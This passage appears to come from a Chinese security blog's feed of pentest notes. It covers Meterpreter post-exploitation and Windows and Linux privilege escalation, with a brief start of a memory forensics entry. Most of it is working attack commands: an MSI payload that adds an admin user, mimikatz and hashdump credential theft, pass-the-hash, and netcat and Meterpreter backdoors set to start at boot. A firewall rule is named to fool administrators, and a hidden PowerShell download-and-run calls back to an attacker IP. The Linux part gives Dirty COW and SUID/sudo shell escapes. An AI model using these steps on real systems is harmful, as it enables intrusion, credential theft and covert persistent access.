-&gt;Windows 组件 -&gt;Windows Installer-&gt; 永远以高特权进行安装：选择启用<br> 3. 组策略 -&gt; 用户配置 -&gt; 管理模版 -&gt;Windows 组件 -&gt;Windows Installer-&gt; 永远以高特权进行安装：选择启用</p><p><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20210306173539689.png" alt="image-20210306173539689"></p><p>设置完成后对应注册表的位置值会设为 1，开启 AlwaysInstallElevated。</p><p>生成 MSI 安装文件</p><p>利用 msfvenom 命令生成一个在目标机上增加管理员用户的 MSI 安装文件，这里密码要设置为强密码，否则会报错。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/adduser USER=msi PASS=Abc123@@ -f msi -o msi.msi</span><br></pre></td></tr></table></figure><p>上传并执行 MSI 文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">upload msi.msi c:\\Users\\test # 部分目录由于权限原因可能上传失败</span><br><span class="line">msiexec /quiet /qn /i msi.msi # /quiet=安装过程中禁止向用户发送消息 /qn=不使用图形界面 /i=安装程序</span><br><span class="line">net localgroup administrators</span><br></pre></td></tr></table></figure><p>执行成功后查看管理员组发现用户已经添加成功</p><p><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20210306173648978.png" alt="image-20210306173648978"></p><p>注意：<br>由于是 msf 生成的 msi 文件，所以默认会被杀毒软件拦截，需要做好免杀。</p><h2 id="窃取-hash-及密码哈希传递"><a class="markdownIt-Anchor" href="#窃取-hash-及密码哈希传递">#</a> 窃取 hash 及密码 &amp; 哈希传递</h2><p>窃取 hash 及密码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hashdump</span><br><span class="line">run post/windows/gather/smart_hashdump</span><br></pre></td></tr></table></figure><p>得到的 hash 可以拿去 <span class="exturl" data-url="aHR0cHM6Ly9jbWQ1LmNvbS8=">https://cmd5.com/</span> 解密一下即是用户密码</p><p>或者 ophrack 进行解密</p><h3 id="mimikatz"><a class="markdownIt-Anchor" href="#mimikatz">#</a> mimikatz</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">msf5:</span><br><span class="line">load mimikatz # 加载 mimikatz 模块</span><br><span class="line">msv # 获取用户和 hash 值</span><br><span class="line">kerberos # 获取内存中的明文密码信息</span><br><span class="line">wdigest # 获取内存中的明文密码信息</span><br><span class="line">mimikatz_command -f a:: # 需要以错误的模块来让正确的模块显示</span><br><span class="line">mimikatz_command -f sekurlsa::searchPasswords # 获取用户密码</span><br><span class="line">mimikatz_command -f samdump::hashes # 执行用户 hash</span><br><span class="line"></span><br><span class="line">msf6：</span><br><span class="line">load kiwi</span><br><span class="line">creds_all</span><br><span class="line">kiwi_cmd sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure><p><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20210306174435101.png" alt="image-20210306174435101"></p><h3 id="哈希传递"><a class="markdownIt-Anchor" href="#哈希传递">#</a> 哈希传递</h3><p>利用 hashdump 得到用户的 hash 后可利用 psexec 模块进行哈希传递攻击。<br>使用 psexec 的前提：SMB 服务必须开启，也就是开启 445 端口；Admin$ 可以访问</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/smb/psexec</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">set LHOST 192.168.183.147</span><br><span class="line">set LPORT 443</span><br><span class="line">set RHOST 192.168.183.154</span><br><span class="line">set SMBUSER Administrator</span><br><span class="line">set SMBPASS ccf**4ee:3db**678</span><br><span class="line">set SMBDOMAIN WORKGROUP # 域用户需要设置 SMBDOMAIN</span><br><span class="line">run</span><br></pre></td></tr></table></figure><h2 id="rdp"><a class="markdownIt-Anchor" href="#rdp">#</a> RDP</h2><h3 id="getgui-命令"><a class="markdownIt-Anchor" href="#getgui-命令">#</a> getgui 命令</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">run getgui –h # 查看帮助</span><br><span class="line">run getgui -e # 开启远程桌面</span><br><span class="line">run getgui -u admin -p admin # 添加用户</span><br><span class="line">run getgui -f 6666 -e # 3389 端口转发到 6666</span><br><span class="line">rdesktop 127.0.0.1:6666</span><br></pre></td></tr></table></figure><h3 id="enable_rdp-脚本"><a class="markdownIt-Anchor" href="#enable_rdp-脚本">#</a> enable_rdp 脚本</h3><p>通过 enable_rdp 脚本将用户添加到远程桌面用户组和管理员用户组</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">run post/windows/manage/enable_rdp #开启远程桌面</span><br><span class="line">run post/windows/manage/enable_rdp USERNAME=admin PASSWORD=admin # 添加用户</span><br><span class="line">run post/windows/manage/enable_rdp FORWARD=true LPORT=6667 # 将 3389 端口转发到 666</span><br></pre></td></tr></table></figure><h3 id="远程桌面"><a class="markdownIt-Anchor" href="#远程桌面">#</a> 远程桌面</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">enumdesktops # 查看可用的桌面</span><br><span class="line">getdesktop # 获取当前 meterpreter 关联的桌面</span><br><span class="line">setdesktop # 设置 meterpreter 关联的桌面 -h 查看帮助</span><br><span class="line">run vnc # 使用 vnc 远程桌面连接</span><br><span class="line">rdesktop 127.0.0.1:1111 # 需要输入用户名密码连接</span><br><span class="line">rdesktop -u Administrator -p 123 127.0.0.1:1111 # -u 用户名 -p 密码</span><br></pre></td></tr></table></figure><h2 id="注册表操作"><a class="markdownIt-Anchor" href="#注册表操作">#</a> 注册表操作</h2><p>注册表基本命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">reg –h # 查看帮助</span><br><span class="line">-k 注册表的路径 -v 键的名称 -d 键值</span><br><span class="line">reg enumkey [-k &lt;key&gt;] # 枚举注册表的内容</span><br><span class="line">reg createkey [-k &lt;key&gt;] # 创建注册表项</span><br><span class="line">reg deletekey [-k &lt;key&gt;] # 删除注册表项</span><br><span class="line">reg setval [-k &lt;key&gt; -v &lt;val&gt; -d &lt;data&gt;] # 在注册表里添加内容</span><br><span class="line">reg deleteval [-k &lt;key&gt; -v &lt;val&gt;] # 删除注册表的值</span><br><span class="line">reg queryval [-k &lt;key&gt; -v &lt;val&gt;] # 查询注册表的值</span><br></pre></td></tr></table></figure><h3 id="利用注册表添加-nc-后门"><a class="markdownIt-Anchor" href="#利用注册表添加-nc-后门">#</a> 利用注册表添加 nc 后门</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">upload /usr/share/windows-binaries/nc.exe C:\\windows\\system32 # 上传 nc 到目标主机</span><br><span class="line">reg enumkey -k HKLM\\software\\microsoft\\windows\\currentversion\\run # 枚举注册表 run 下的键值</span><br><span class="line">reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v test_nc -d &#x27;C:\windows\system32\nc.exe -Ldp 443</span><br><span class="line">-e cmd.exe&#x27; # 设置键值 -v 键的名称 -d 键值</span><br><span class="line">reg queryval -k HKLM\\software\\microsoft\\windows\\currentversion\\Run -v test_nc # 查看 test_nc 的键值</span><br></pre></td></tr></table></figure><p><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20210306175106706.png" alt="image-20210306175106706"></p><p>2. 设置防火墙允许通过 443 端口（如果目标主机开启防火墙，没有设置相应的规则可能会导致连接失败。）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">shell</span><br><span class="line">netsh firewall show opmode # 查看防火墙状态</span><br><span class="line">netsh firewall add portopening TCP 443 &quot;网络发现(Pub PSD-Out)&quot; ENABLE ALL # 添加防火墙的规则允许 443 端口通过(这里“网络发现</span><br><span class="line">(Pub PSD-Out)”是规则名称，目的是为了迷惑管理员。)</span><br></pre></td></tr></table></figure><p>3. 待目标主机重启后，自启 nc 程序，然后我们利用 nc 连接即</p><p><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20210306175148419.png" alt="image-20210306175148419"></p><h2 id="后门植入"><a class="markdownIt-Anchor" href="#后门植入">#</a> 后门植入</h2><p>在我们通过漏洞获取到目标主机权限之后，如果目标主机主机重启亦或是管理员发现并修补了漏洞，那么我们就会失去对服务器的控制权，所以我们需要通过植入后门来维持权限，前面说的 nc 后门就是其中一种，另外一般还有 Persistence 和 Metsvc</p><h3 id="persistence通过启动项安装"><a class="markdownIt-Anchor" href="#persistence通过启动项安装">#</a> Persistence (通过启动项安装)</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">run persistence –h # 查看帮助</span><br><span class="line">run persistence -X -i 5 -p 3333 -r 本地IP</span><br><span class="line">run persistence -U -i 5 -p 3333 -r 本地IP -L c:\\Windows\\System32</span><br><span class="line">-X：设置后门在系统启动后自启动。该方式会在 HKLM\Software\Microsoft\Windows\CurrentVersion\Run 下添加注册表信息。由于权限原因会导</span><br><span class="line">致添加失败，后门无法启动。因此在非管理员权限下，不推荐使用该参数</span><br><span class="line">-U：设置后门在用户登录后自启动。该方式会在 HKCU\Software\Microsoft\Windows\CurrentVersion\Run 下添加注册表信息</span><br><span class="line">-L：后门传到远程主机的位置默认为%TEMP%</span><br><span class="line">-i：设置反向连接间隔时间为 5 秒</span><br><span class="line">-p：设置反向连接的端口号</span><br><span class="line">-r：设置反向连接的 ip 地址</span><br></pre></td></tr></table></figure><p><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20210306180420630.png" alt="image-20210306180420630"></p><p><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20210306180507815.png" alt="image-20210306180507815"></p><p>靶机被成功植入后门</p><p><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20210306181305480.png" alt="image-20210306181305480"></p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">backgroup</span><br><span class="line">use exploit/multi/handler</span><br><span class="line"><span class="built_in">set</span> lhost <span class="number">172</span>.<span class="number">16</span>.<span class="number">10</span>.<span class="number">197</span></span><br><span class="line"><span class="built_in">set</span> lport <span class="number">4444</span></span><br><span class="line"><span class="built_in">set</span> paylod windows/meterpreter/reverse_tcp</span><br><span class="line">exploit 成功获得shell</span><br></pre></td></tr></table></figure><p><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20210306180717910.png" alt="image-20210306180717910"></p><h3 id="metsvc通过服务安装一句话需要权限"><a class="markdownIt-Anchor" href="#metsvc通过服务安装一句话需要权限">#</a> Metsvc (通过服务安装) 一句话需要权限</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">run metsvc -h # 查看帮助</span><br><span class="line">run metsvc -A # 自动安装后门</span><br><span class="line">run metsvc -r # 删除后门</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">连接后门</span><br><span class="line">use exploit/multi/handler</span><br><span class="line"><span class="built_in">set</span> payload windows/metsvc_bind_tcp</span><br><span class="line"><span class="built_in">set</span> rhost <span class="number">192</span>.<span class="number">168</span>.<span class="number">183</span>.<span class="number">169</span></span><br><span class="line"><span class="built_in">set</span> lport <span class="number">31337</span></span><br><span class="line">run</span><br></pre></td></tr></table></figure><h3 id="powershell-后门"><a class="markdownIt-Anchor" href="#powershell-后门">#</a> Powershell 后门</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/script/web_delivery</span><br><span class="line"><span class="built_in">set</span> payload windows/meterpreter/reverse_tcp</span><br><span class="line"><span class="built_in">set</span> LHOST <span class="number">192</span>.<span class="number">168</span>.<span class="number">183</span>.<span class="number">147</span></span><br><span class="line"><span class="built_in">set</span> LPORT <span class="number">2334</span></span><br><span class="line"><span class="built_in">set</span> srvport <span class="number">2333</span></span><br><span class="line"><span class="built_in">set</span> uripath /</span><br><span class="line"><span class="built_in">set</span> target <span class="number">5</span></span><br><span class="line">run</span><br><span class="line">在目标设备 <span class="built_in">cmd</span> 上执行以下命令即可反弹</span><br><span class="line">powershell.exe -nop -w hidden -c $z=&quot;<span class="built_in">echo</span> ($env:temp+&#x27;\eJedcsJE.exe&#x27;)&quot;; (new-object</span><br><span class="line">System.<span class="built_in">Net</span>.WebClient).DownloadFile(&#x27;http://<span class="number">192</span>.<span class="number">168</span>.<span class="number">183</span>.<span class="number">147</span>:<span class="number">2333</span>/&#x27;, $z); invoke-item $z</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> meterpreter学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows内核提权</title>
      <link href="2021/04/16/Windows%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83/"/>
      <url>2021/04/16/Windows%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83/</url>
      
        <content type="html"><![CDATA[<h2 id="windows内核提权"><a class="markdownIt-Anchor" href="#windows内核提权">#</a> Windows 内核提权</h2><p><strong>Cve-2016-7269 低权限提权</strong></p><p>第一种方法</p><p>利用模块进行渗透</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/iis/cve-2017-7269</span><br><span class="line">set rhosts IP</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure><p><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20210320163403824.png" alt="image-20210320163403824"></p><p>发现是 windows 低权限，限免进行提权</p><h3 id="生成exe上传反弹木马"><a class="markdownIt-Anchor" href="#生成exe上传反弹木马">#</a> 生成 exe 上传反弹木马</h3><p>生成反弹木马</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msfpc windows 本地IP 3333</span><br><span class="line">mv windows-*.exe 1.exe</span><br><span class="line">msfconsole -r windows-*exe.rc</span><br></pre></td></tr></table></figure><p><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20210320163757983.png" alt="image-20210320172549963"></p><p><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20210320163555815.png" alt="image-20210320163555815"></p><p>上传 1.exe 到 C:/1 / 下，进行反弹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">execute -f 1.exe</span><br></pre></td></tr></table></figure><p><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20210320163856952.png" alt="image-20210320163856952"></p><p><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20210320163912440.png" alt="image-20210320163757983"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">利用run post/multi/recon/local_exploit_suggester 查看可利用模块</span><br></pre></td></tr></table></figure><p><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20210320164413649.png" alt="image-20210320165533159"></p><p><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20210320165555084.png" alt="image-20210320164413649"></p><p>获得 windows 高权限</p><h2 id="扩展方法"><a class="markdownIt-Anchor" href="#扩展方法">#</a> 扩展方法</h2><h3 id="令牌提权"><a class="markdownIt-Anchor" href="#令牌提权">#</a> 令牌提权</h3><p><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20210320171633846.png" alt="image-20210320171633846"></p><p>低权限令牌提权</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use incognito # 加载窃取令牌模块</span><br><span class="line">list_tokens -u # 查看可用的用户令牌</span><br><span class="line">list_tokens -g # 查看可用的用户组令牌</span><br><span class="line">impersonate_token &#x27;NT AUTHORITY\SYSTEM&#x27; # 假冒 SYSTEM token</span><br><span class="line">rev2self #返回原始 token</span><br></pre></td></tr></table></figure><p><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20210320172549963.png" alt="image-20210320165555084"></p>]]></content>
      
      
      
        <tags>
            
            <tag> Windows内核提权 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux提权</title>
      <link href="2021/04/10/Linux%E6%8F%90%E6%9D%83%E7%AC%94%E8%AE%B0/"/>
      <url>2021/04/10/Linux%E6%8F%90%E6%9D%83%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h2 id="linux提权笔记"><a class="markdownIt-Anchor" href="#linux提权笔记">#</a> linux 提权笔记</h2><h4 id="利用内核漏洞提权"><a class="markdownIt-Anchor" href="#利用内核漏洞提权">#</a>  <code>利用内核漏洞提权</code></h4><p>先开启一个可以交互的终端</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">python -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br><span class="line">python -c &#x27;import pty;pty.spawn(&quot;/bin/sh&quot;)&#x27;</span><br><span class="line">/bin/bash -i</span><br><span class="line">echo os.system(&quot;/bin/bash&quot;);</span><br></pre></td></tr></table></figure><p>发现靶机是低权限</p><p><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20210409090920475.png" alt="image-20210409090920475"></p><p>查看靶机内核，发现其版本为 Ubuntu 14.04.</p><p><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20210409091109670.png" alt="image-20210409091109670"></p><p>打开 kali 查询可利用的 exploit，将其下载</p><p><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20210409091229671.png" alt="image-20210409091229671"></p><p>利用 python 将其传递到靶机上</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 8081</span><br><span class="line">python -m SimpleHTTPServer 8081</span><br><span class="line">靶机：wget http://IP:8081/37292.c</span><br></pre></td></tr></table></figure><p><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20210409091411379.png" alt="image-20210409091411379"></p><p>将 exp 进行编译执行，成功获得 root 权限</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc -o 37292.c 37292</span><br><span class="line">./37292</span><br></pre></td></tr></table></figure><h4 id="利用旧版本nmap提权"><a class="markdownIt-Anchor" href="#利用旧版本nmap提权">#</a>  <code>利用旧版本nmap提权</code></h4><p><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20210409095550386.png" alt="image-20210409091614007"></p><p>nmap 支持 “interactive.” 选项，用户能够通过该选项执行 shell 命令，通常，安全人员会使用该命令来避免他们使用 nmap 命令被记录在 history 文件中</p><p>查看可利用的提权 find /-perm -u=s 2&gt;/dev/null</p><p><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20210409095637576.png" alt="image-20210409095550386"></p><p>发现 nmap 存在提权漏洞</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">利用nmap --interactive </span><br><span class="line">!sh成功提权</span><br></pre></td></tr></table></figure><p><strong><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20210409091614007.png" alt="image-20210409095637576"></strong></p><h4 id="环境变量提权"><a class="markdownIt-Anchor" href="#环境变量提权">#</a>  <code>环境变量提权</code></h4><p>利用普通用户找到可执行文件，进行提权</p><p><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20210409102649196.png" alt="image-20210122091212588"></p><p><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20210409102540192.png" alt="image-20210409102649196"></p><h4 id="脏牛提权"><a class="markdownIt-Anchor" href="#脏牛提权">#</a>  <code>脏牛提权</code></h4><p>使用 <code>uname -a</code>  命令查看 linux 内核信息，发现在脏牛漏洞范围内，可以进行测试。</p><p>(需要 root 用户存在可执行文件)</p><p><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20210122091212588.png" alt="image-20210409102540192"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">searchsploit dirty</span><br><span class="line">searchsploit -m 40839.c</span><br></pre></td></tr></table></figure><p><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20210122091605012.png" alt="image-20210410094828540"></p><p>3. 将 exp 一下载到本地，使用 gcc -pthread dirty.c -o dirty -lcrypt` 命令对 dirty.c 进行编译，生成一个 dirty 的可执行文件。</p><figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">chmod 777 40839.c</span><br><span class="line">gcc -pthread 40839.c -o 40839 -lcrypt</span><br><span class="line">./40839</span><br><span class="line">等一会passwd文件会生成一个firefart用户</span><br><span class="line">su firefart (输入之前的密码,成功提权)</span><br></pre></td></tr></table></figure><h4 id="find提权"><a class="markdownIt-Anchor" href="#find提权">#</a>  <code>find提权</code></h4><p>(DC-01)</p><p>先查找拥有 suid 权限的文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20210410094828540.png" alt="image-20210410095644313"></p><p>进行提权</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">touch test.txt</span><br><span class="line">find / -type f -name test.txt -exec &quot;whoami&quot; \; 发现是root权限</span><br><span class="line">find / -type f -name test.txt -exec &quot;/bin/sh&quot; \; 成功提权</span><br></pre></td></tr></table></figure><h4 id="git提权"><a class="markdownIt-Anchor" href="#git提权">#</a>  <code>git提权</code></h4><p>(DC-02)</p><p>寻找可用提权</p><p><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20210410095644313.png" alt="image-20210122091605012"></p><p>绕过 rbash 进行提权</p><p><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20210410093833321.png" alt="image-20210410100730655"></p><p>可用命令有 less、ls、scp、vi，绕过可用如下方法：</p><ul><li>可使用 less 绕过：$less test  然后！‘sh’</li><li>使用 ls 绕过：$man ls  然后！‘sh’</li><li>使用 vi 绕过：$vi test  然后:!/bin/sh 或者 :!/bin/bash</li></ul><p>还可以用 BASH_CMDS [a]=/bin/sh;a 直接绕过</p><p>或者更改环境变量，并查看 flag3.txt</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">BASH_CMDS[a]=/bin/sh;a  注：把/bin/bash给a变量`</span><br><span class="line">export PATH=$PATH:/bin/    注：将/bin 作为PATH环境变量导出</span><br><span class="line">export PATH=$PATH:/usr/bin   注：将/usr/bin作为PATH环境变量导出</span><br></pre></td></tr></table></figure><p><strong>尝试 git 提权</strong>：可使用 sudo git help config 或者 sudo git -p help</p><p><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20210410093844939.png" alt="image-20210410093833321"></p><h4 id="sudo提权"><a class="markdownIt-Anchor" href="#sudo提权">#</a>  <code>sudo提权</code></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">如果知道用户为空密码可以尝试sudo提权</span><br><span class="line">sudo -l， sudo su</span><br><span class="line">或者su root 尝试弱口令</span><br></pre></td></tr></table></figure><h4 id="awk提权"><a class="markdownIt-Anchor" href="#awk提权">#</a>  <code>awk提权</code></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo awk &#x27;BEGIN&#123;system(&quot;/bin/sh&quot;)&#125;&#x27;</span><br></pre></td></tr></table></figure><p>提权成功</p><p><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20210410100702235.png" alt="image-20210410093844939"></p><h4 id="man提权"><a class="markdownIt-Anchor" href="#man提权">#</a>  <code>man提权</code></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo man man</span><br></pre></td></tr></table></figure><p><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20210410100730655.png" alt="image-20210410100740319"></p><p><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20210410100740319.png" alt="image-20210410100702235"></p><h4 id="curl提权"><a class="markdownIt-Anchor" href="#curl提权">#</a>  <code>curl提权</code></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo curl file:///etc/shadow</span><br></pre></td></tr></table></figure><p><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20210410100812432.png" alt="image-20210410101229024"></p><h4 id="crontab提权"><a class="markdownIt-Anchor" href="#crontab提权">#</a>  <code>crontab提权</code></h4><p>cat /etc/crontab</p><p>模拟一下<img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20210410101229024.png" alt="image-20210410100812432"></p><p>防范：crontab 任务千万不要写到 /etc/crontab 文件里。通过 crontab -e 去创建，让他写到默认的 /var/spool/cron 下；创建任务时，避免使用 root 去创建任务，若用 root 创建任务，注意设置权限，避免 root 权限执行任务。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Linux提权 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>内存取证</title>
      <link href="2021/04/09/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/"/>
      <url>2021/04/09/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/</url>
      
        <content type="html"><![CDATA[<h1 id="内存取证"><a class="markdownIt-Anchor" href="#内存取证">#</a> <strong>内存取证</strong></h1><h2 id="volatility-使用"><a class="markdownIt-Anchor" href="#volatility-使用">#</a> <strong>volatility 使用：</strong></h2><h3 id="获取内存镜像的摘要信息"><a class="markdownIt-Anchor" href="#获取内存镜像的摘要信息">#</a> <strong>获取内存镜像的摘要信息</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility -f mem.raw imageinfo</span><br></pre></td></tr></table></figure><p><strong><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20201102135222699.png" alt="image-20201102135222699"></strong></p><blockquote><p><strong>判断系统版本应该是 Win7SP1x64</strong></p></blockquote><h3 id="查看进程信息"><a class="markdownIt-Anchor" href="#查看进程信息">#</a> <strong>查看进程信息</strong></h3><p><strong>pslist 可以直接列出运行的进程，如果进程已经结束，会在 Exit 列显示日期和时间，表明进程已经结束</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility -f mem.raw --profile=Win7SP1x64 pslist</span><br></pre></td></tr></table></figure><p><strong><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20201102141316628.png" alt="image-20201102141316628"></strong></p><h3 id="查看隐藏进程"><a class="markdownIt-Anchor" href="#查看隐藏进程">#</a> 